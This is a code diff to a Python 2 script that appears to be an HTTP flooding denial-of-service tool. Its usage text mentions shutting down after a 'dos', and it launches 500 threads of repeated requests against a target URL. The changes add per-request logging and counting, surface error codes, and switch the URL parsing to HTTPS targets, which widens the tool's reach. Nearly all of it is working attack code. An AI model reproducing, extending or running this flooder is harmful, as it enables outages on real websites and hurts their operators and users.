@@ -12,6 +12,8 @@ import sys
 import threading
 import random
 import re
+import json
+import datetime
 
 #global params
 url=''
@@ -74,6 +76,12 @@ def usage():
 	print 'you can add "safe" after url, to autoshut after dos'
 	print '---------------------------------------------------'
 
+def log(request):
+	global request_counter
+	print datetime.datetime.now(), 'REQUEST COUNT :', request_counter, '>>>', request.get_full_url()
+	# print request.get_method()
+	# print json.dumps(request.headers, indent=4, sort_keys=True)
+	# print dir(request)  # list lots of other stuff in Request
 	
 #http request
 def httpcall(url):
@@ -93,18 +101,21 @@ def httpcall(url):
 	request.add_header('Connection', 'keep-alive')
 	request.add_header('Host',host)
 	try:
+			inc_counter()
+			log(request)
 			urllib2.urlopen(request)
 	except urllib2.HTTPError, e:
-			#print e.code
+			print e.code
 			set_flag(1)
 			print 'Response Code 500'
 			code=500
 	except urllib2.URLError, e:
-			#print e.reason
+			print e.reason
 			sys.exit()
-	else:
-			inc_counter()
-			urllib2.urlopen(request)
+	# else:
+			# log(request)
+			# inc_counter()
+			# urllib2.urlopen(request)
 	return(code)		
 
 	
@@ -146,8 +157,9 @@ else:
 		url = sys.argv[1]
 		if url.count("/")==2:
 			url = url + "/"
-		m = re.search('http\://([^/]*)/?.*', url)
+		m = re.search('https\://([^/]*)/?.*', url)
 		host = m.group(1)
+		# print httpcall(url)
 		for i in range(500):
 			t = HTTPThread()
 			t.start()
